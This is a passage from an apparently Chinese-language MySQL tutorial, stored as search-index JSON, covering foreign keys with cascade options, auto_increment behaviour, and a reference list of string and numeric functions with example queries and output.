values(2,101,'Mary'); mysql> insert into emp values(3,108,'Daji'); //\u53cd\u4f8b\uff1a\u63d2\u5165\u7236\u8868\u4e2d\u4e0d\u5b58\u5728\u7684\u90e8\u95e8\u53f7 ERROR 1452 (23000): Cannot add or update a child row: a foreign key constraint fails (`up`.`emp`, CONSTRAINT `emp_ibfk_1` FOREIGN KEY (`edno`) REFERENCES `dept` (`dno`)) \u5220\u9664\u7236\u8868\u4e2d\u7684\u6570\u636e mysql> select * from dept; +-----+---------+ | dno | dname | +-----+---------+ | 100 | manager | | 101 | dba | | 102 | hr | | 103 | sa | +-----+---------+ mysql> select * from emp; +------+------+-------+ | eno | edno | ename | +------+------+-------+ | 1 | 100 | Tom | | 2 | 101 | Mary | +------+------+-------+ 2 rows in set (0.00 sec) mysql> delete from dept where dno=102; mysql> delete from dept where dno=101; ERROR 1451 (23000): Cannot delete or update a parent row: a foreign key constraint fails (`up`.`emp`, CONSTRAINT `emp_ibfk_1` FOREIGN KEY (`edno`) REFERENCES `dept` (`dno`)) \u4ee5\u4e0a\u5c0f\u5b9e\u9a8c\u5c0f\u7ed3\uff1a 1\uff09\u5b50\u8868\u4e2d\u7684\u6570\u636e\u4f9d\u8d56\u4e8e\u7236\u8868\uff0c\u4e0d\u80fd\u5411\u5b50\u8868\u4e2d\u63d2\u5165\u7236\u8868\u4e2d\u4e0d\u5b58\u5728\u7684\u503c 2\uff09\u4e0d\u80fd\u5220\u9664\u7236\u8868\u4e2d\u88ab\u5b50\u8868\u6240\u4f9d\u8d56\u7684\u884c \u5982\u4f55\u89e3\u51b3\uff1f on delete cascade \u7ea7\u8054\u5220\u9664 on update cascade \u7ea7\u8054\u66f4\u65b0 mysql> drop table emp; \u5b8c\u6574\u7684\u5916\u952e\u521b\u5efa mysql> create table emp (eno int,edno int,ename char(10),index(edno),foreign key (edno) references dept(dno) on delete cascade on update cascade); mysql> insert into emp values(1,100,'Tom'); mysql> insert into emp values(2,101,'Songjiang'); mysql> insert into emp values(5,101,'Likui'); mysql> delete from dept where dno=101; mysql> select * from dept; +-----+---------+ | dno | dname | +-----+---------+ | 100 | manager | | 103 | sa | +-----+---------+ 2 rows in set (0.00 sec) mysql> select * from emp; +------+------+-------+ | eno | edno | ename | +------+------+-------+ | 1 | 100 | Tom | +------+------+-------+ 1 row in set (0.00 sec) mysql> update dept set dno=110 where dno=100; mysql> select * from emp; +------+------+-------+ | eno | edno | ename | +------+------+-------+ | 1 | 110 | Tom | +------+------+-------+ 1 row in set (0.00 sec) \u6709\u4e86\u7ea7\u8054\u5220\u9664\u548c\u7ea7\u8054\u4fee\u6539\u9009\u9879\uff0c\u7236\u8868\u4e2d\u7684\u6570\u636e\u53d1\u751f\u5220\u9664\u6216\u8005\u66f4\u65b0\u65f6\uff0c\u5b50\u8868\u4e2d\u7684\u6570\u636e\u4e5f\u4f1a\u53d1\u751f\u76f8\u5e94\u7684\u53d8\u5316\u3002 \u5220\u9664\u5916\u952e \u67e5\u770b\u5916\u952e\u7684\u540d\u5b57 mysql> show create table emp\\G *************************** 1. row *************************** Table: emp Create Table: CREATE TABLE `emp` ( `eno` int(11) DEFAULT NULL, `edno` int(11) DEFAULT NULL, `ename` char(10) DEFAULT NULL, KEY `edno` (`edno`), //\u7d22\u5f15 CONSTRAINT `emp_ibfk_1` FOREIGN KEY (`edno`) REFERENCES `dept` (`dno`) ON DELETE CASCADE ON UPDATE CASCADE ) ENGINE=InnoDB DEFAULT CHARSET=utf8 1 row in set (0.00 sec) mysql> alter table emp drop foreign key emp_ibfk_1;","title":"5\u3001\u5916\u952e    foreign key"},{"location":"database/mysql/constraint/#6-auto_increment","text":"\u8981\u6c42\uff1a 1\uff09\u8be5\u5b57\u6bb5\u7684\u7c7b\u578b\u5fc5\u987b\u662f\u6570\u503c\u578b\u7684 2\uff09\u5b57\u6bb5\u4e0a\u8981\u6709\u552f\u4e00\u6027\u7d22\u5f15\u6216\u4e3b\u952e mysql> create table zz (id int primary key auto_increment); mysql> desc zz; +-------+---------+------+-----+---------+----------------+ | Field | Type | Null | Key | Default | Extra | +-------+---------+------+-----+---------+----------------+ | id | int(11) | NO | PRI | NULL | auto_increment | +-------+---------+------+-----+---------+----------------+ 1 row in set (0.00 sec) mysql> insert into zz values(); Query OK, 1 row affected (0.02 sec) mysql> select * from zz; +----+ | id | +----+ | 1 | +----+ 1 row in set (0.00 sec) \u51e0\u70b9\u8bf4\u660e\uff1a 1\uff09\u5f53\u81ea\u589e\u5b57\u6bb5\u53d1\u751f\u65ad\u6863\u65f6\uff0c\u503c\u4ece\u6700\u5927\u503c\u7ee7\u7eed\u81ea\u589e mysql> insert into zz values(); Query OK, 1 row affected (0.01 sec) mysql> select * from zz; +----+ | id | +----+ | 1 | | 2 | | 5 | | 6 | +----+ 4 rows in set (0.00 sec) 2\uff09\u5f53\u7528delete\u5220\u9664\u6700\u5927\u503c\u65f6\uff0c\u4e0b\u4e00\u4e2a\u503c\u4ecd\u7136\u4ece\u6700\u5927\u503c\u7684\u4e0b\u4e00\u4e2a\u7ee7\u7eed\u81ea\u589e mysql> delete from zz where id=6; Query OK, 1 row affected (0.04 sec) mysql> insert into zz values(); Query OK, 1 row affected (0.00 sec) mysql> select * from zz; +----+ | id | +----+ | 1 | | 2 | | 5 | | 7 | +----+ 4 rows in set (0.00 sec) 3\uff09\u5f53\u4f60truncate\u4e00\u4e2a\u8868\u65f6\uff0c\u503c\u4ece1\u5f00\u59cb\u91cd\u65b0\u8ba1\u7b97 mysql> truncate table zz; Query OK, 0 rows affected (0.05 sec) mysql> insert into zz values(); Query OK, 1 row affected (0.00 sec) mysql> select * from zz; +----+ | id | +----+ | 1 | +----+ 1 row in set (0.00 sec) \u200b","title":"6\u3001\u81ea\u589e     auto_increment"},{"location":"database/mysql/function/","text":"\u51fd\u6570 \u4e3e\u4f8b \u4e00\u3001\u65f6\u95f4\u51fd\u6570 \u200b 1\u3001\u67e5\u770b\u5f53\u524d\u65f6\u95f4 mysql> select current_time(); mysql> select curtime(); \u200b 2\u3001\u67e5\u770b\u5f53\u524d\u65e5\u671f mysql> select current_date(); mysql> select curdate(); \u200b 3\u3001\u67e5\u770b\u5f53\u524d\u7684\u7cfb\u7edf\u65f6\u95f4 mysql> select now(); mysql> select sysdate(); \u4e8c\u3001\u805a\u5408\u51fd\u6570 \u6c42\u548c sum(\u5b57\u6bb5\u540d) \u6c42\u5e73\u5747\u503c avg(\u5b57\u6bb5\u540d) \u6c42\u6700\u5927\u503c max(\u5b57\u6bb5\u540d) \u6c42\u6700\u5c0f\u503c min(\u5b57\u6bb5\u540d) \u7edf\u8ba1\u5339\u914d\u884c\u6570 count(\u5b57\u6bb5\u540d) count(*)\uff1a\u7528\u4e8e\u7edf\u8ba1\u8868\u4e2d\u6709\u591a\u5c11\u6761\u8bb0\u5f55 \u51c6\u5907\u73af\u5883 mysql> create table score (sno int,sname char(10),ule int,ula int,uoa int); mysql> insert into score values(1,'tom',70,80,90),(2,'mary',55,75,65),(3,'jack',75,45,95),(4,'mike',90,100,86); mysql> select * from score; +------+-------+------+------+------+ | sno | sname | ule | ula | uoa | +------+-------+------+------+------+ | 1 | tom | 70 | 80 | 90 | | 2 | mary | 55 | 75 | 65 | | 3 | jack | 75 | 45 | 95 | | 4 | mike | 90 | 100 | 86 | +------+-------+------+------+------+ 4 rows in set (0.01 sec) \u663e\u793aule\u6700\u9ad8\u5206\uff0cula\u6700\u4f4e\u5206 mysql> select max(ule),min(ula) from score; +----------+----------+ | max(ule) | min(ula) | +----------+----------+ | 90 | 45 | +----------+----------+ 1 row in set (0.01 sec) -------------------------------------------------- \u5217\u7684\u522b\u540d \u5199\u6cd5\uff1a\u5217\u540d [as] \u522b\u540d mysql> select max(ule) mule,min(ula) as mula from score; //\u7ed9\u5217\u8d77\u522b\u540d +------+------+ | mule | nula | +------+------+ | 90 | 45 | +------+------+ -------------------------------------------------- \u7edf\u8ba1\u8868\u4e2d\u7684\u884c\u6570(\u8bb0\u5f55\u6570) mysql> select count(*) from score; +----------+ | count(*) | +----------+ | 4 | +----------+ 1 row in set (0.00 sec) mysql> insert into score values(); mysql> select count(sno) from score; //\u5ffd\u7565\u7a7a\u503c +------------+ | count(sno) | +------------+ | 4 | +------------+ 1 row in set (0.00 sec) mysql> delete from score where sno is null; //\u5c06sno\u5b57\u6bb5\u4e3a\u7a7a\u7684\u884c\u5220\u9664\u6389 is null\uff1a\u7528\u6765\u5339\u914d\u7a7a\u7684 is not null\uff1a\u5339\u914d\u975e\u7a7a\u7684 \u8ba1\u7b97ula\u7684\u5e73\u5747\u6210\u7ee9 mysql> select avg(ula) from score; +----------+ | avg(ula) | +----------+ | 75.0000 | +----------+ 1 row in set (0.00 sec) \u67e5\u8be2\u6bcf\u4e00\u79d1\u7684\u603b\u6210\u7ee9 mysql> select sum(ule),sum(ula),sum(uoa) from score; +----------+----------+----------+ | sum(ule) | sum(ula) | sum(uoa) | +----------+----------+----------+ | 290 | 300 | 336 | +----------+----------+----------+ 1 row in set (0.00 sec) \u67e5\u8be2\u6bcf\u4e2a\u5b66\u751f\u7684\u59d3\u540d\u548c\u603b\u6210\u7ee9 mysql> select sname,ule+ula+uoa total from score; //select\u540e\u9762\u53ef\u4ee5\u52a0\u7b97\u6570\u8868\u8fbe\u5f0f +-------+-------+ | sname | total | +-------+-------+ | tom | 240 | | mary | 195 | | jack | 215 | | mike | 276 | +-------+-------+ 4 rows in set (0.00 sec) \u67e5\u8be2\u6bcf\u4e2a\u5b66\u751f\u7684\u59d3\u540d\u548c\u5e73\u5747\u6210\u7ee9 mysql> select sname,(ule+ula+uoa)/3 ave from score; +-------+---------+ | sname | ave | +-------+---------+ | tom | 80.0000 | | mary | 65.0000 | | jack | 71.6667 | | mike | 92.0000 | +-------+---------+ 4 rows in set (0.00 sec) \u4e09\u3001\u5176\u5b83\u51fd\u6570 1\u3001\u8fde\u63a5\u51fd\u6570 concat() concatnate\uff1a\u8fde\u63a5 mysql> select concat(sno,sname) from score; +-------------------+ | concat(sno,sname) | +-------------------+ | 1tom | | 2mary | | 3jack | | 4mike | +-------------------+ 4 rows in set (0.00 sec) mysql> select concat(sno,' ',sname) from score; //\u5355\u5f15\u53f7\u4e2d\u95f4\u662f\u5b57\u7b26\u4e32 2\u3001upper() \u8f6c\u6362\u6210\u5927\u5199 \u200b lower() \u8f6c\u6362\u6210\u5c0f\u5199 mysql> select sname,upper(sname) from score; +-------+--------------+ | sname | upper(sname) | +-------+--------------+ | tom | TOM | | mary | MARY | | jack | JACK | | mike | MIKE | +-------+--------------+ 4 rows in set (0.02 sec) mysql> select upper('dsadas'); +-----------------+ | upper('dsadas') | +-----------------+ | DSADAS | +-----------------+ 1 row in set (0.00 sec) 3\u3001\u6c42\u957f\u5ea6 length() mysql> select length('dadasdasfdswdredgcdf'); +--------------------------------+ | length('dadasdasfdswdredgcdf') | +--------------------------------+ | 20 | +--------------------------------+ 1 row in set (0.02 sec) mysql> select sname,length(sname) from score; +-------+---------------+ | sname | length(sname) | +-------+---------------+ | tom | 3 | | mary | 4 | | jack | 4 | | mike | 4 | +-------+---------------+ 4 rows in set (0.01 sec) MySQL \u6709\u5f88\u591a\u5185\u7f6e\u7684\u51fd\u6570\uff0c\u4ee5\u4e0b\u5217\u51fa\u4e86\u8fd9\u4e9b\u51fd\u6570\u7684\u8bf4\u660e\u3002 MySQL \u5b57\u7b26\u4e32\u51fd\u6570 \u51fd\u6570 \u63cf\u8ff0 \u5b9e\u4f8b ASCII(s) \u8fd4\u56de\u5b57\u7b26\u4e32 s \u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u7684 ASCII \u7801\u3002 \u8fd4\u56de CustomerName \u5b57\u6bb5\u7b2c\u4e00\u4e2a\u5b57\u6bcd\u7684 ASCII \u7801\uff1a SELECT ASCII(CustomerName) AS NumCodeOfFirstChar FROM Customers; CHAR_LENGTH(s) \u8fd4\u56de\u5b57\u7b26\u4e32 s \u7684\u5b57\u7b26\u6570 \u8fd4\u56de\u5b57\u7b26\u4e32 RUNOOB \u7684\u5b57\u7b26\u6570 SELECT CHAR_LENGTH(\"RUNOOB\") AS LengthOfString; CHARACTER_LENGTH(s) \u8fd4\u56de\u5b57\u7b26\u4e32 s \u7684\u5b57\u7b26\u6570\uff0c\u7b49\u540c\u4e8e CHAR_LENGTH(s) \u8fd4\u56de\u5b57\u7b26\u4e32 RUNOOB \u7684\u5b57\u7b26\u6570 SELECT CHARACTER_LENGTH(\"RUNOOB\") AS LengthOfString; CONCAT(s1,s2...sn) \u5b57\u7b26\u4e32 s1,s2 \u7b49\u591a\u4e2a\u5b57\u7b26\u4e32\u5408\u5e76\u4e3a\u4e00\u4e2a\u5b57\u7b26\u4e32 \u5408\u5e76\u591a\u4e2a\u5b57\u7b26\u4e32 SELECT CONCAT(\"SQL \", \"Runoob \", \"Gooogle \", \"Facebook\") AS ConcatenatedString; CONCAT_WS(x, s1,s2...sn) \u540c CONCAT(s1,s2,...) \u51fd\u6570\uff0c\u4f46\u662f\u6bcf\u4e2a\u5b57\u7b26\u4e32\u4e4b\u95f4\u8981\u52a0\u4e0a x\uff0cx \u53ef\u4ee5\u662f\u5206\u9694\u7b26 \u5408\u5e76\u591a\u4e2a\u5b57\u7b26\u4e32\uff0c\u5e76\u6dfb\u52a0\u5206\u9694\u7b26\uff1a SELECT CONCAT_WS(\"-\", \"SQL\", \"Tutorial\", \"is\", \"fun!\")AS ConcatenatedString; FIELD(s,s1,s2...) \u8fd4\u56de\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e32 s \u5728\u5b57\u7b26\u4e32\u5217\u8868(s1,s2...)\u4e2d\u7684\u4f4d\u7f6e \u8fd4\u56de\u5b57\u7b26\u4e32 c \u5728\u5217\u8868\u503c\u4e2d\u7684\u4f4d\u7f6e\uff1a SELECT FIELD(\"c\", \"a\", \"b\", \"c\", \"d\", \"e\"); FIND_IN_SET(s1,s2) \u8fd4\u56de\u5728\u5b57\u7b26\u4e32s2\u4e2d\u4e0es1\u5339\u914d\u7684\u5b57\u7b26\u4e32\u7684\u4f4d\u7f6e \u8fd4\u56de\u5b57\u7b26\u4e32 c \u5728\u6307\u5b9a\u5b57\u7b26\u4e32\u4e2d\u7684\u4f4d\u7f6e\uff1a SELECT FIND_IN_SET(\"c\", \"a,b,c,d,e\"); FORMAT(x,n) \u51fd\u6570\u53ef\u4ee5\u5c06\u6570\u5b57 x \u8fdb\u884c\u683c\u5f0f\u5316 \"#,###.##\", \u5c06 x \u4fdd\u7559\u5230\u5c0f\u6570\u70b9\u540e n \u4f4d\uff0c\u6700\u540e\u4e00\u4f4d\u56db\u820d\u4e94\u5165\u3002 \u683c\u5f0f\u5316\u6570\u5b57 \"#,###.##\" \u5f62\u5f0f\uff1a SELECT FORMAT(250500.5634, 2); -- \u8f93\u51fa 250,500.56 INSERT(s1,x,len,s2) \u5b57\u7b26\u4e32 s2 \u66ff\u6362 s1 \u7684 x \u4f4d\u7f6e\u5f00\u59cb\u957f\u5ea6\u4e3a len \u7684\u5b57\u7b26\u4e32 \u4ece\u5b57\u7b26\u4e32\u7b2c\u4e00\u4e2a\u4f4d\u7f6e\u5f00\u59cb\u7684 6 \u4e2a\u5b57\u7b26\u66ff\u6362\u4e3a runoob\uff1a SELECT INSERT(\"google.com\", 1, 6, \"runoob\"); -- \u8f93\u51fa\uff1arunoob.com LOCATE(s1,s) \u4ece\u5b57\u7b26\u4e32 s \u4e2d\u83b7\u53d6 s1 \u7684\u5f00\u59cb\u4f4d\u7f6e \u83b7\u53d6 b \u5728\u5b57\u7b26\u4e32 abc \u4e2d\u7684\u4f4d\u7f6e\uff1a SELECT LOCATE('st','myteststring'); -- 5 \u8fd4\u56de\u5b57\u7b26\u4e32 abc \u4e2d b \u7684\u4f4d\u7f6e\uff1a SELECT LOCATE('b', 'abc') -- 2 LCASE(s) \u5c06\u5b57\u7b26\u4e32 s \u7684\u6240\u6709\u5b57\u6bcd\u53d8\u6210\u5c0f\u5199\u5b57\u6bcd \u5b57\u7b26\u4e32 RUNOOB \u8f6c\u6362\u4e3a\u5c0f\u5199\uff1a SELECT LCASE('RUNOOB') -- runoob LEFT(s,n) \u8fd4\u56de\u5b57\u7b26\u4e32 s \u7684\u524d n \u4e2a\u5b57\u7b26 \u8fd4\u56de\u5b57\u7b26\u4e32 runoob \u4e2d\u7684\u524d\u4e24\u4e2a\u5b57\u7b26\uff1a SELECT LEFT('runoob',2) -- ru LOWER(s) \u5c06\u5b57\u7b26\u4e32 s \u7684\u6240\u6709\u5b57\u6bcd\u53d8\u6210\u5c0f\u5199\u5b57\u6bcd \u5b57\u7b26\u4e32 RUNOOB \u8f6c\u6362\u4e3a\u5c0f\u5199\uff1a SELECT LOWER('RUNOOB') -- runoob LPAD(s1,len,s2) \u5728\u5b57\u7b26\u4e32 s1 \u7684\u5f00\u59cb\u5904\u586b\u5145\u5b57\u7b26\u4e32 s2\uff0c\u4f7f\u5b57\u7b26\u4e32\u957f\u5ea6\u8fbe\u5230 len \u5c06\u5b57\u7b26\u4e32 xx \u586b\u5145\u5230 abc \u5b57\u7b26\u4e32\u7684\u5f00\u59cb\u5904\uff1a SELECT LPAD('abc',5,'xx') -- xxabc LTRIM(s) \u53bb\u6389\u5b57\u7b26\u4e32 s \u5f00\u59cb\u5904\u7684\u7a7a\u683c \u53bb\u6389\u5b57\u7b26\u4e32 RUNOOB\u5f00\u59cb\u5904\u7684\u7a7a\u683c\uff1a SELECT LTRIM(\" RUNOOB\") AS LeftTrimmedString;-- RUNOOB MID(s,n,len) \u4ece\u5b57\u7b26\u4e32 s \u7684 n \u4f4d\u7f6e\u622a\u53d6\u957f\u5ea6\u4e3a len \u7684\u5b50\u5b57\u7b26\u4e32\uff0c\u540c SUBSTRING(s,n,len) \u4ece\u5b57\u7b26\u4e32 RUNOOB \u4e2d\u7684\u7b2c 2 \u4e2a\u4f4d\u7f6e\u622a\u53d6 3\u4e2a \u5b57\u7b26\uff1a SELECT MID(\"RUNOOB\", 2, 3) AS ExtractString; -- UNO POSITION(s1 IN s) \u4ece\u5b57\u7b26\u4e32 s \u4e2d\u83b7\u53d6 s1 \u7684\u5f00\u59cb\u4f4d\u7f6e \u8fd4\u56de\u5b57\u7b26\u4e32 abc \u4e2d b \u7684\u4f4d\u7f6e\uff1a SELECT POSITION('b' in 'abc') -- 2 REPEAT(s,n) \u5c06\u5b57\u7b26\u4e32 s \u91cd\u590d n \u6b21 \u5c06\u5b57\u7b26\u4e32 runoob \u91cd\u590d\u4e09\u6b21\uff1a SELECT REPEAT('runoob',3) -- runoobrunoobrunoob REPLACE(s,s1,s2) \u5c06\u5b57\u7b26\u4e32 s2 \u66ff\u4ee3\u5b57\u7b26\u4e32 s \u4e2d\u7684\u5b57\u7b26\u4e32 s1 \u5c06\u5b57\u7b26\u4e32 abc \u4e2d\u7684\u5b57\u7b26 a \u66ff\u6362\u4e3a\u5b57\u7b26 x\uff1a SELECT REPLACE('abc','a','x') --xbc REVERSE(s) \u5c06\u5b57\u7b26\u4e32s\u7684\u987a\u5e8f\u53cd\u8fc7\u6765 \u5c06\u5b57\u7b26\u4e32 abc \u7684\u987a\u5e8f\u53cd\u8fc7\u6765\uff1a SELECT REVERSE('abc') -- cba RIGHT(s,n) \u8fd4\u56de\u5b57\u7b26\u4e32 s \u7684\u540e n \u4e2a\u5b57\u7b26 \u8fd4\u56de\u5b57\u7b26\u4e32 runoob \u7684\u540e\u4e24\u4e2a\u5b57\u7b26\uff1a SELECT RIGHT('runoob',2) -- ob RPAD(s1,len,s2) \u5728\u5b57\u7b26\u4e32 s1 \u7684\u7ed3\u5c3e\u5904\u6dfb\u52a0\u5b57\u7b26\u4e32 s2\uff0c\u4f7f\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u8fbe\u5230 len \u5c06\u5b57\u7b26\u4e32 xx \u586b\u5145\u5230 abc \u5b57\u7b26\u4e32\u7684\u7ed3\u5c3e\u5904\uff1a SELECT RPAD('abc',5,'xx') -- abcxx RTRIM(s) \u53bb\u6389\u5b57\u7b26\u4e32 s \u7ed3\u5c3e\u5904\u7684\u7a7a\u683c \u53bb\u6389\u5b57\u7b26\u4e32 RUNOOB \u7684\u672b\u5c3e\u7a7a\u683c\uff1a SELECT RTRIM(\"RUNOOB \") AS RightTrimmedString; -- RUNOOB SPACE(n) \u8fd4\u56de n \u4e2a\u7a7a\u683c \u8fd4\u56de 10 \u4e2a\u7a7a\u683c\uff1a SELECT SPACE(10); STRCMP(s1,s2) \u6bd4\u8f83\u5b57\u7b26\u4e32 s1 \u548c s2\uff0c\u5982\u679c s1 \u4e0e s2 \u76f8\u7b49\u8fd4\u56de 0 \uff0c\u5982\u679c s1>s2 \u8fd4\u56de 1\uff0c\u5982\u679c s1<s2 \u8fd4\u56de -1 \u6bd4\u8f83\u5b57\u7b26\u4e32\uff1a SELECT STRCMP(\"runoob\", \"runoob\"); -- 0 SUBSTR(s, start, length) \u4ece\u5b57\u7b26\u4e32 s \u7684 start \u4f4d\u7f6e\u622a\u53d6\u957f\u5ea6\u4e3a length \u7684\u5b50\u5b57\u7b26\u4e32 \u4ece\u5b57\u7b26\u4e32 RUNOOB \u4e2d\u7684\u7b2c 2 \u4e2a\u4f4d\u7f6e\u622a\u53d6 3\u4e2a \u5b57\u7b26\uff1a SELECT SUBSTR(\"RUNOOB\", 2, 3) AS ExtractString; -- UNO SUBSTRING(s, start, length) \u4ece\u5b57\u7b26\u4e32 s \u7684 start \u4f4d\u7f6e\u622a\u53d6\u957f\u5ea6\u4e3a length \u7684\u5b50\u5b57\u7b26\u4e32\uff0c\u7b49\u540c\u4e8e SUBSTR(s, start, length) \u4ece\u5b57\u7b26\u4e32 RUNOOB \u4e2d\u7684\u7b2c 2 \u4e2a\u4f4d\u7f6e\u622a\u53d6 3\u4e2a \u5b57\u7b26\uff1a SELECT SUBSTRING(\"RUNOOB\", 2, 3) AS ExtractString; -- UNO SUBSTRING_INDEX(s, delimiter, number) \u8fd4\u56de\u4ece\u5b57\u7b26\u4e32 s \u7684\u7b2c number \u4e2a\u51fa\u73b0\u7684\u5206\u9694\u7b26 delimiter \u4e4b\u540e\u7684\u5b50\u4e32\u3002 \u5982\u679c number \u662f\u6b63\u6570\uff0c\u8fd4\u56de\u7b2c number \u4e2a\u5b57\u7b26\u5de6\u8fb9\u7684\u5b57\u7b26\u4e32\u3002 \u5982\u679c number \u662f\u8d1f\u6570\uff0c\u8fd4\u56de\u7b2c(number \u7684\u7edd\u5bf9\u503c(\u4ece\u53f3\u8fb9\u6570))\u4e2a\u5b57\u7b26\u53f3\u8fb9\u7684\u5b57\u7b26\u4e32\u3002 SELECT SUBSTRING_INDEX('a*b','*',1) -- a SELECT SUBSTRING_INDEX('a*b','*',-1) -- b SELECT SUBSTRING_INDEX(SUBSTRING_INDEX('a*b*c*d*e','*',3),'*',-1) -- c TRIM(s) \u53bb\u6389\u5b57\u7b26\u4e32 s \u5f00\u59cb\u548c\u7ed3\u5c3e\u5904\u7684\u7a7a\u683c \u53bb\u6389\u5b57\u7b26\u4e32 RUNOOB \u7684\u9996\u5c3e\u7a7a\u683c\uff1a SELECT TRIM(' RUNOOB ') AS TrimmedString; UCASE(s) \u5c06\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u5927\u5199 \u5c06\u5b57\u7b26\u4e32 runoob \u8f6c\u6362\u4e3a\u5927\u5199\uff1a SELECT UCASE(\"runoob\"); -- RUNOOB UPPER(s) \u5c06\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u5927\u5199 \u5c06\u5b57\u7b26\u4e32 runoob \u8f6c\u6362\u4e3a\u5927\u5199\uff1a SELECT UPPER(\"runoob\"); -- RUNOOB MySQL \u6570\u5b57\u51fd\u6570 \u51fd\u6570\u540d \u63cf\u8ff0 \u5b9e\u4f8b ABS(x) \u8fd4\u56de x \u7684\u7edd\u5bf9\u503c \u8fd4\u56de -1 \u7684\u7edd\u5bf9\u503c\uff1a SELECT ABS(-1) -- \u8fd4\u56de1 ACOS(x) \u6c42 x \u7684\u53cd\u4f59\u5f26\u503c\uff08\u5355\u4f4d\u4e3a\u5f27\u5ea6\uff09\uff0cx \u4e3a\u4e00\u4e2a\u6570\u503c SELECT ACOS(0.25); ASIN(x) \u6c42\u53cd\u6b63\u5f26\u503c\uff08\u5355\u4f4d\u4e3a\u5f27\u5ea6\uff09\uff0cx \u4e3a\u4e00\u4e2a\u6570\u503c SELECT ASIN(0.25); ATAN(x) \u6c42\u53cd\u6b63\u5207\u503c\uff08\u5355\u4f4d\u4e3a\u5f27\u5ea6\uff09\uff0cx \u4e3a\u4e00\u4e2a\u6570\u503c SELECT ATAN(2.5); ATAN2(n, m) \u6c42\u53cd\u6b63\u5207\u503c\uff08\u5355\u4f4d\u4e3a\u5f27\u5ea6\uff09 SELECT ATAN2(-0.8, 2); AVG(expression) \u8fd4\u56de\u4e00\u4e2a\u8868\u8fbe\u5f0f\u7684\u5e73\u5747\u503c\uff0cexpression \u662f\u4e00\u4e2a\u5b57\u6bb5 \u8fd4\u56de Products \u8868\u4e2dPrice \u5b57\u6bb5\u7684\u5e73\u5747\u503c\uff1a SELECT AVG(Price) AS AveragePrice FROM Products; CEIL(x) \u8fd4\u56de\u5927\u4e8e\u6216\u7b49\u4e8e x \u7684\u6700\u5c0f\u6574\u6570 SELECT CEIL(1.5) -- \u8fd4\u56de2 CEILING(x) \u8fd4\u56de\u5927\u4e8e\u6216\u7b49\u4e8e x \u7684\u6700\u5c0f\u6574\u6570 SELECT CEILING(1.5); -- \u8fd4\u56de2 COS(x) \u6c42\u4f59\u5f26\u503c(\u53c2\u6570\u662f\u5f27\u5ea6) SELECT COS(2); COT(x) \u6c42\u4f59\u5207\u503c(\u53c2\u6570\u662f\u5f27\u5ea6) SELECT COT(6); COUNT(expression) \u8fd4\u56de\u67e5\u8be2\u7684\u8bb0\u5f55\u603b\u6570\uff0cexpression \u53c2\u6570\u662f\u4e00\u4e2a\u5b57\u6bb5\u6216\u8005 * \u53f7 \u8fd4\u56de Products \u8868\u4e2d products \u5b57\u6bb5\u603b\u5171\u6709\u591a\u5c11\u6761\u8bb0\u5f55\uff1a SELECT COUNT(ProductID) AS NumberOfProducts FROM Products; DEGREES(x) \u5c06\u5f27\u5ea6\u8f6c\u6362\u4e3a\u89d2\u5ea6 SELECT DEGREES(3.1415926535898) -- 180 n DIV m \u6574\u9664\uff0cn \u4e3a\u88ab\u9664\u6570\uff0cm \u4e3a\u9664\u6570 \u8ba1\u7b97 10 \u9664\u4e8e 5\uff1a SELECT 10 DIV 5; -- 2 EXP(x) \u8fd4\u56de e \u7684 x \u6b21\u65b9 \u8ba1\u7b97 e \u7684\u4e09\u6b21\u65b9\uff1a SELECT EXP(3) -- 20.085536923188 FLOOR(x) \u8fd4\u56de\u5c0f\u4e8e\u6216\u7b49\u4e8e x \u7684\u6700\u5927\u6574\u6570 \u5c0f\u4e8e\u6216\u7b49\u4e8e 1.5 \u7684\u6574\u6570\uff1a SELECT FLOOR(1.5) -- \u8fd4\u56de1 GREATEST(expr1, expr2, expr3, ...) \u8fd4\u56de\u5217\u8868\u4e2d\u7684\u6700\u5927\u503c \u8fd4\u56de\u4ee5\u4e0b\u6570\u5b57\u5217\u8868\u4e2d\u7684\u6700\u5927\u503c\uff1a SELECT GREATEST(3, 12, 34, 8, 25); -- 34 \u8fd4\u56de\u4ee5\u4e0b\u5b57\u7b26\u4e32\u5217\u8868\u4e2d\u7684\u6700\u5927\u503c\uff1a SELECT GREATEST(\"Google\", \"Runoob\", \"Apple\"); -- Runoob LEAST(expr1, expr2, expr3, ...) \u8fd4\u56de\u5217\u8868\u4e2d\u7684\u6700\u5c0f\u503c \u8fd4\u56de\u4ee5\u4e0b\u6570\u5b57\u5217\u8868\u4e2d\u7684\u6700\u5c0f\u503c\uff1a SELECT LEAST(3, 12, 34, 8, 25); -- 3 \u8fd4\u56de\u4ee5\u4e0b\u5b57\u7b26\u4e32\u5217\u8868\u4e2d\u7684\u6700\u5c0f\u503c\uff1a SELECT LEAST(\"Google\", \"Runoob\", \"Apple\"); -- Apple LN \u8fd4\u56de\u6570\u5b57\u7684\u81ea\u7136\u5bf9\u6570\uff0c\u4ee5 e \u4e3a\u5e95\u3002 \u8fd4\u56de 2 \u7684\u81ea\u7136\u5bf9\u6570\uff1a SELECT LN(2); -- 0.6931471805599453 LOG(x) \u6216 LOG(base, x) \u8fd4\u56de\u81ea\u7136\u5bf9\u6570(\u4ee5 e \u4e3a\u5e95\u7684\u5bf9\u6570)\uff0c\u5982\u679c\u5e26\u6709 base \u53c2\u6570\uff0c\u5219 base \u4e3a\u6307\u5b9a\u5e26\u5e95\u6570\u3002 SELECT LOG(20.085536923188) -- 3 SELECT LOG(2, 4); -- 2 LOG10(x) \u8fd4\u56de\u4ee5 10 \u4e3a\u5e95\u7684\u5bf9\u6570 SELECT LOG10(100) -- 2 LOG2(x) \u8fd4\u56de\u4ee5 2 \u4e3a\u5e95\u7684\u5bf9\u6570 \u8fd4\u56de\u4ee5 2 \u4e3a\u5e95 6 \u7684\u5bf9\u6570\uff1a SELECT LOG2(6); -- 2.584962500721156 MAX(expression) \u8fd4\u56de\u5b57\u6bb5 expression \u4e2d\u7684\u6700\u5927\u503c \u8fd4\u56de\u6570\u636e\u8868 Products \u4e2d\u5b57\u6bb5 Price \u7684\u6700\u5927\u503c\uff1a SELECT MAX(Price) AS LargestPrice FROM Products; MIN(expression) \u8fd4\u56de\u5b57\u6bb5 expression \u4e2d\u7684\u6700\u5c0f\u503c \u8fd4\u56de\u6570\u636e\u8868 Products \u4e2d\u5b57\u6bb5 